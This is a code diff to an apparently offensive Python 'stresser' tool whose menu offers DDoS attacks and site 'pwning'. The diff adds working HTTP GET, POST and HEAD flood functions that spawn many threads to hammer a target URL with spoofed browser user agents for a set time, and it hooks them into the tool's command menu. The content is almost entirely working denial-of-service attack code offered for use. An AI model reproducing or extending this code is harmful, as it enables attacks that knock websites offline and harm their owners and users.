@@ -33,10 +33,11 @@ makedir()
 def savelog(url):
     try:
         response = requests.get(url)
+        head = response.headers
         ray = response.headers.get("CF-Ray")
         code = response.status_code
         server = response.headers.get("Server")
-        results = "{}\n{}\n{}\n{}\n\n".format(url, code, ray, server)
+        results = "{}\n{}\n{}\n{}\n{}\n\n".format(url, code, ray, server, head)
         target = 'LOGS/logs'
         def log(target):
             file = open((target) + ".txt", "a")
@@ -112,6 +113,12 @@ class logo():
         logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"STRESSER V1"+'\033[1;35m'+"  | "+'\033[0m'+"STRESSER V1    "+'\033[1;35m'+" ║ \n"
         logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"STRESSER V2 "+'\033[1;35m'+" | "+'\033[0m'+"STRESSER V2    "+'\033[1;35m'+" ║ \n"
         logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"PWN "+'\033[1;35m'+"         | "+'\033[0m'+"Pwn a site     "+'\033[1;35m'+" ║ \n"
+        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"GET "+'\033[1;35m'+"         | "+'\033[0m'+"Flood With     "+'\033[1;35m'+" ║ \n"
+        logo += "\t\t║                | "+'\033[0m'+"Get Method      "+'\033[1;35m'+"║ \n"
+        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"POST "+'\033[1;35m'+"        | "+'\033[0m'+"Flood With     "+'\033[1;35m'+" ║ \n"
+        logo += "\t\t║                | "+'\033[0m'+"Post Method     "+'\033[1;35m'+"║ \n"
+        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"HEAD "+'\033[1;35m'+"        | "+'\033[0m'+"Flood With     "+'\033[1;35m'+" ║ \n"
+        logo += "\t\t║                | "+'\033[0m'+"Head Method     "+'\033[1;35m'+"║ \n"
         logo += "\t\t╚══════════════════════════"+'\033[0m'+"════════╝ \n"
         print(logo)
     def layer4(): #udp tcp tls syn ack esp icmp ssh
@@ -679,6 +686,70 @@ class DDOS():
                 timer.start()
                 attack(url, threadsi, t)
                 timer.join()
+        class requests():
+            def head():
+                def start_head(url, threadsi, t):
+                    for _ in range(int(threadsi)):
+                        threads = threading.Thread(target=attack_head, args=(url, t))
+                        threads.start()
+                def attack_head(url, t):
+                    ua = UserAgent()
+                    head = {
+                        "User-Agent": ua.chrome
+                    }
+                    try:
+                        requests.head(url, headers=head)
+                        requests.head(url, headers=head)
+                    except:
+                        pass
+                if __name__ == '__main__':
+                    url, threadsi, t = layer7_target()
+                    timer = threading.Thread(target=countdown, args=(t,))
+                    timer.start()
+                    start_head(url, threadsi, t)
+                    timer.join()
+            def post():
+                def start_head(url, threadsi, t):
+                    for _ in range(int(threadsi)):
+                        threads = threading.Thread(target=attack_head, args=(url, t))
+                        threads.start()
+                def attack_head(url, t):
+                    ua = UserAgent()
+                    head = {
+                        "User-Agent": ua.chrome
+                    }
+                    try:
+                        requests.post(url, headers=head)
+                        requests.post(url, headers=head)
+                    except:
+                        pass
+                if __name__ == '__main__':
+                    url, threadsi, t = layer7_target()
+                    timer = threading.Thread(target=countdown, args=(t,))
+                    timer.start()
+                    start_head(url, threadsi, t)
+                    timer.join()
+            def get():
+                def start_head(url, threadsi, t):
+                    for _ in range(int(threadsi)):
+                        threads = threading.Thread(target=attack_head, args=(url, t))
+                        threads.start()
+                def attack_head(url, t):
+                    ua = UserAgent()
+                    head = {
+                        "User-Agent": ua.chrome
+                    }
+                    try:
+                        requests.get(url, headers=head)
+                        requests.get(url, headers=head)
+                    except:
+                        pass
+                if __name__ == '__main__':
+                    url, threadsi, t = layer7_target()
+                    timer = threading.Thread(target=countdown, args=(t,))
+                    timer.start()
+                    start_head(url, threadsi, t)
+                    timer.join()
         ################LAYER 4################
         ###UDP TCP TLS SYN ACK ICMP ESP SSH ###
         
@@ -924,6 +995,12 @@ class main():
                     DDOS.PXSKY()
                 elif prompt.lower() == 'pxstar':
                     DDOS.PXSTAR()
+                elif prompt.lower() == 'get':
+                    DDOS.requests.get()
+                elif prompt.lower() == 'post':
+                    DDOS.requests.post()
+                elif prompt.lower() == 'head':
+                    DDOS.requests.head()
                 elif prompt.lower() == 'crawl':
                     TOOLS.webcrawler()
                 elif prompt.lower() == 'ping':
